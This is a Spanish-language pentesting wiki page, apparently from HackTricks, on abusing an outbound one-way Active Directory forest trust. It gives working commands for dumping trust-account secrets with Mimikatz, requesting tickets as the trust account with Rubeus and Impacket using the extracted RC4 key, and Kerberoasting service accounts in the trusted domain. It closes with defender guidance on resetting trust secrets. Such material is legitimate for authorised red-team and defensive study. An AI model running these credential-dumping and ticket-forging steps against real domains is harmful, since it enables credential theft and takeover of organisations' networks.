# Dominio de bosque externo - Unidireccional (Outbound)

{{#include ../../banners/hacktricks-training.md}}

En este escenario, **tu dominio** está **confiando algunos **privilegios** a principals de un **dominio/bosque** diferente.

## Enumeración

### Confianza saliente
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Si tienes disponible el módulo de AD, inspecciona también directamente el **Trusted Domain Object (TDO)**. Esto te proporciona los datos de trust sin procesar respaldados por LDAP que necesitarás más adelante para decidir si el camino sencillo es el **FSP/group abuse** o el **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
También deberías enumerar dónde se concedió realmente acceso a las entidades extranjeras de `CN=ForeignSecurityPrincipals`. Algunos casos habituales son:

- **Administrador local** en un servidor/DC de tu dominio actual
- Pertenencia a un **grupo de dominio personalizado** que tenga ACLs sobre usuarios/equipos/GPOs
- Permisos para modificar **objetos de equipo**, que posteriormente pueden convertirse en [RBCD](resource-based-constrained-delegation.md) si la configuración de trust lo permite

## Ataque a la cuenta de trust

Cuando se crea un trust unidireccional desde el dominio/forest **B** hacia el dominio/forest **A** (**B confía en A**), se crea una **cuenta de trust** para **B** en **A**. Desde la perspectiva del trust saliente de **A**, esto resulta útil porque, si posteriormente comprometes **B** (el lado que confía), puedes hacer dump del secreto del trust allí y autenticarte de vuelta en **A** como `B$`.<sup>[[1]](#references)</sup>

El aspecto fundamental que hay que entender es que la contraseña y el material de Kerberos de esa cuenta de trust pueden extraerse de un Domain Controller del dominio que confía mediante:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Esto funciona porque la cuenta de confianza creada en el dominio **trusted** es un principal habilitado que termina teniendo los permisos básicos de un usuario de dominio normal allí. Esto suele ser suficiente para empezar a enumerar LDAP, solicitar tickets y encontrar la siguiente ruta de escalada.<sup>[[1]](#references)</sup>

En un escenario en el que `ext.local` es el dominio **trusting** y `root.local` es el dominio **trusted**, se crea una cuenta de usuario llamada `EXT$` dentro de `root.local`. Volcar las claves de confianza de `ext.local` revela credenciales que pueden utilizarse como `root.local\EXT$` contra `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
A continuación, utiliza la clave **RC4** extraída para autenticarte como `root.local\EXT$` dentro de `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
A continuación, enumera el dominio de confianza como ese principal, por ejemplo haciendo Kerberoasting de un SPN de alto valor en `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Desde Linux

Si recuperaste la clave de la cuenta de confianza **RC4**, la misma idea funciona desde Linux con Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Si **RC4** no es aceptado, usa como alternativa la **contraseña en texto plano** recuperada (o las claves **AES** derivadas) y reutiliza los flujos de trabajo habituales de [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) y [Kerberoast](kerberoast.md) desde ese foothold.

### Errores comunes con el material de claves

No confundas las **claves de trust** con las **credenciales de la cuenta de trust**:<sup>[[1]](#references)</sup>

- En un trust unidireccional, ambos lados almacenan un **TDO**, pero la cuenta de usuario **`EXT$`** real solo existe en el dominio trusted.
- La contraseña actual de la cuenta de trust se refleja en el trust secret del TDO (`NewPassword` / clave de trust actual).
- La clave **RC4** de trust es el artefacto más fácil de reutilizar con `asktgt` como la cuenta de trust; en configuraciones predeterminadas, normalmente es el enctype operativo porque la cuenta de trust suele tener un `msDS-SupportedEncryptionTypes` vacío.
- Si estás pensando en términos de **claves AES de trust**, recuerda que no son intercambiables con las claves AES de la cuenta de trust porque los salts son diferentes.

Por tanto, para la técnica de esta página, prioriza el material **RC4** extraído o la contraseña en **texto plano** recuperada.<sup>[[1]](#references)</sup>

### Obtención de la contraseña de trust en texto plano

En el flujo anterior se utilizó el hash de trust en lugar de la **contraseña en texto plano** (que también es **extraída por mimikatz**).<sup>[[1]](#references)</sup>

La contraseña en texto plano se puede obtener convirtiendo a hexadecimal la salida \[ CLEAR ] de mimikatz y eliminando los bytes nulos `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Obtención de la contraseña de trust en texto plano: La contraseña en texto plano se puede obtener convirtiendo a hexadecimal la salida ( CLEAR ) de mimikatz y eliminando los bytes nulos...](<../../images/image (938).png>)

A veces, al crear una relación de trust, el usuario debe introducir una contraseña para el trust. En esta demostración, la clave es la contraseña de trust original y, por tanto, es legible para humanos. Cuando la clave rota (valor predeterminado: cada 30 días), el texto en plano normalmente deja de ser legible para humanos, pero sigue siendo técnicamente utilizable.<sup>[[1]](#references)</sup>

La contraseña en texto plano se puede utilizar para realizar una autenticación normal como la cuenta de trust, como alternativa a solicitar un TGT con la clave secreta Kerberos de la cuenta de trust. Aquí, consultando `root.local` desde `ext.local` en busca de miembros de `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Obtención de la contraseña de trust en texto plano: La contraseña en texto plano se puede utilizar para realizar una autenticación normal como la cuenta de trust, como alternativa a solicitar un TGT...](<../../images/image (792).png>)

### Limitaciones prácticas

> [!WARNING]
> Las cuentas de trust son principals difíciles de manejar. Los logons interactivos, como **RUNAS / console / RDP**, no son el flujo esperado aquí, y los intentos de autenticación **NTLM** pueden fallar con `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. En su lugar, planifica **logons de red Kerberos** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Nota sobre persistencia / limpieza

Si los defensores descubren que el dominio trusting fue comprometido, deberían rotar el trust secret en **ambos lados** con `netdom trust ... /resetOneSide ...`. Desde la perspectiva de un operador, esto es importante porque un **reset manual invalida inmediatamente el material de trust antiguo**, mientras que la rotación normal de la contraseña de trust conserva los valores actual/anterior durante el rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referencias

- [1] [¿SID filter como límite de seguridad entre dominios? (Parte 7) – Ataque a la cuenta de confianza: de trusting a trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [Recuperación de AD Forest – Restablecimiento de una contraseña de confianza](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
